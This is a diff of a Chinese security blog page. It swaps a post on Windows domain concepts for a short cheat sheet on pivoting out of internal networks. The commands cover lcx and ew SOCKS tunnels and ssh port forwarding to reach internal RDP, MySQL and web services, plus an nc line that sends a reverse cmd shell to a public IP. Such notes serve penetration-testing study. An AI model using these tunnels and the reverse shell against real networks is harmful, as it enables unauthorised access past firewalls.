@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="Doo-J">
   <meta name="keywords" content="">
-  <title>域渗透-概念 - Doo-J</title>
+  <title>内网穿透 - Doo-J</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
 <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
@@ -124,7 +124,7 @@
               
                 <p class="mt-3 post-meta">
                   <i class="fas fa-calendar-alt" aria-hidden="true"></i>
-                  星期五, 十月 25日 2019, 1:22 下午
+                  星期五, 十二月 27日 2019, 10:14 上午
                 </p>
               
 
@@ -133,7 +133,7 @@
                   
                   <span class="post-meta">
                     <i class="far fa-chart-bar"></i>
-                    1.1k 字
+                    708 字
                   </span>
                 
 
@@ -169,40 +169,55 @@
           <div class="post-content mx-auto" id="post">
             
             <div class="markdown-body">
-              <h2 id="域渗透-概念"><a href="#域渗透-概念" class="headerlink" title="域渗透-概念"></a>域渗透-概念</h2><h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h3><p>初次了解域渗透，并不是很了解域的概念，并不清楚域的一些功用。因此记录一些前置的知识和自己的理解</p>
-<h3 id="0x01-工作组"><a href="#0x01-工作组" class="headerlink" title="0x01 工作组"></a>0x01 工作组</h3><p>工作组是局域网中的一个概念，由若干同一地点、同一网络的用户组成的小组。</p>
-<p>工作组中的计算机是对等的，即访问每台电脑需要用对应电脑的账户登陆，才能获取资源。</p>
-<h3 id="0x02-域"><a href="#0x02-域" class="headerlink" title="0x02 域"></a>0x02 域</h3><p>域–Domain，windows网络中独立运行的单位，域之间相互访问需要建立信任关系。信任是域与域之间的桥梁。两个域之间建立了信任关系，则可以跨域管理、实现跨域网络资源共享、相互通信与数据传输。</p>
-<p>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部。每个域都有自己的安全策略。</p>
-<p>简单来说，如果计算机入域，则各种策略全部由域控来定，登陆验证也是由域控来验证。如果你在域内存在账号密码，你可以用这个账号尼玛登陆域内任何一台计算机。而不像工作组，每一台计算机都有自己的账户，登陆验证也是在本机验证。</p>
-<h3 id="0x03-域控"><a href="#0x03-域控" class="headerlink" title="0x03 域控"></a>0x03 域控</h3><p>域控–Domain Controller，顾名思义，就是负责来调控整个域的服务器。域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当计算机入域时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源。总的来说，域控就像是<strong>中央集权</strong>，每个用户通过<strong>中央</strong>提供的权利账户，通过验证，才能访问域内共享资源。</p>
-<h3 id="0x04-活动目录"><a href="#0x04-活动目录" class="headerlink" title="0x04 活动目录"></a>0x04 活动目录</h3><p>活动目录-Active Directory，windows网络上的目录服务，包含着整个域内的对象（用户账户、计算机账户、打印机、共享文件等）和安全策略。活动目录实现了目录服务，让我们能够对域内进行集中式管理。</p>
-<ul>
-<li><p>管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略</p>
-</li>
-<li><p>管理用户域账户、用户信息、通信录、用户组管理、用户身份认证、用户授权管理，实施组管理策略</p>
-</li>
-<li><p>管理网络共享资源（打印机、文件共享服务等）</p>
-</li>
-<li><p>系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等</p>
-</li>
-<li><p>支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统</p>
-</li>
-</ul>
-<h3 id="0x05-域树、域林及林根域"><a href="#0x05-域树、域林及林根域" class="headerlink" title="0x05 域树、域林及林根域"></a>0x05 域树、域林及林根域</h3><ul>
-<li><p>域树：由一组具有连续命名空间的域组成，树中的域层次越深级别越低，一个”.”则代表一个层次，树中的域通过信任关系连接，这些域共享同一表结构和配置，形成一个连续的域名空间，重点是连续的，这种结构关系就好比中央(DC)实施中央集权，地方上的县城就是一个一个的”域”，<strong>指定范围内</strong> 的县城构成一个市，也就是树。</p>
-</li>
-<li><p>域林：林由<strong>一个或多个</strong>域树组成，一个或多个，所以林是可以只包含一个树，就类似与直辖市，既是市，行政级别上又和省厅同级，一般林会由多个树组成，类似于一个省份下面有多个市，以上举的例子可能不是很贴切，不过大概上就是这个意思。</p>
-</li>
-<li><p>林根域：根域就是第一个被创建的域，可知林根域就是域林中第一个被创建的域。</p>
-</li>
-</ul>
+              <h2 id="lcx"><a href="#lcx" class="headerlink" title="lcx"></a>lcx</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p>
+<p>C可以访问公网，不能被公网访问</p>
+<p>命令：<br>C：lcx.exe -slave 47.101.36.165 7777 127.0.0.1 3389<br>B：lcx.exe -listen 7777 8888</p>
+<p>此时，可以主机A可以通过访问公网IP加端口8888来连接内网主机C的3389</p>
+<h2 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h2><p>情景：<br>本地内网主机：A<br>公网主机：B<br>目标内网主机：C</p>
+<p>C可以访问公网，不能被公网访问</p>
+<p>命令：<br>B：nc -lvvp 8888<br>C：nc -t -e cmd 47.101.36.165 8888</p>
+<p>此时，公网主机B能收到内网主机C的反弹cmd</p>
+<h2 id="ew"><a href="#ew" class="headerlink" title="ew"></a>ew</h2><h3 id="情景1："><a href="#情景1：" class="headerlink" title="情景1："></a>情景1：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
+<p>C主机可以访问公网，也可以访问内网，外网主机不能访问主机C和D</p>
+<p>命令：<br>B：ew_linux_x64 -s rcsocks -l 8008 -e 7777<br>C：ew_win32.exe -s rssocks -d 47.101.36.165 -e 7777</p>
+<h3 id="情景2："><a href="#情景2：" class="headerlink" title="情景2："></a>情景2：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
+<p>C主机有公网IP和内网IP，只能访问内网D主机，无法访问其他内网主机，D主机无法访问外网</p>
+<p>命令：<br>D：ew_linux_x64 -s ssocksd -l 8888<br>C：ew_win32.exe -s lcx_tran -l 1080 -f 192.168.100.244 -g 8888</p>
+<p>再通过公网IP加端口就可以达到通过D主机访问内网资源的目的</p>
+<h3 id="情景3："><a href="#情景3：" class="headerlink" title="情景3："></a>情景3：</h3><p>本地内网主机：A<br>公网主机：B<br>目标内网主机：C<br>目标内网主机：D</p>
+<p>C主机可以访问外网，仅能访问内网D主机，D主机不能访问外网，可以访问内网资源</p>
+<p>B：ew_linux_x64 -s lcx_listen -l 8008 -e 8009<br>D：ew_linux_x64 -s ssocksd -l 9999<br>C：ew_win32.exe -lcx_slave -d 47.101.36.165 -e 8009 -f 192.168.100.244 -g 9999</p>
+<p>此时，可以通过公网IP加端口作为代理，访问内网资源</p>
+<p>三级跳例子：<br>./ew -s rcsocks -l 1080 -e 8888<br>./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999<br>./ew -s lcx_listen -l 9999 -e 7777<br>./ew -s rssocks -d 127.0.0.1 -e 7777<br>数据流向为   IE -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</p>
+<h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><h3 id="情景1：-1"><a href="#情景1：-1" class="headerlink" title="情景1："></a>情景1：</h3><p>本地主机A<br>公网主机B</p>
+<p>公网主机B存在mysql服务，但只能主机B本地访问</p>
+<p>命令：<br>C：ssh -CfNg -L 1234 127.0.0.1:3306 <a href="mailto:root@47.101.36.165">root@47.101.36.165</a></p>
+<p>此时，我们可以通过mysql -h 127.0.0.1 -u root -p -P 1234 来连接公网主机B的mysql</p>
+<h3 id="情景2：-1"><a href="#情景2：-1" class="headerlink" title="情景2："></a>情景2：</h3><p>本地主机A<br>公网主机B<br>目标主机C</p>
+<p>公网主机C可以访问外网，不可以被之间访问<br>采用远程转发，将主机C的端口转发至主机B，此时访问主机B的端口，即访问主机C的端口</p>
+<p>命令：<br>C：ssh -CfNg -R 7777:127.0.0.1:80 <a href="mailto:root@47.101.36.176">root@47.101.36.176</a></p>
+<p>此时，访问公网主机B的IP加7777端口即为访问主机C的80端口</p>
 
             </div>
             <hr>
             <div>
               <p>
                 
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">内网穿透</a>
+                    
+                  </span>
                 
               </p>
               
@@ -217,7 +232,7 @@
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2019/10/24/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
+                      <a href="/2019/10/25/%E5%9F%9F%E6%B8%97%E9%80%8F-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/">
                         <span class="hidden-mobile">域渗透-环境搭建</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="fa fa-chevron-right"></i>
@@ -390,7 +405,7 @@
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "域渗透-概念&nbsp;",
+        "内网穿透&nbsp;",
       ],
       cursorChar: "",
       typeSpeed: 70,
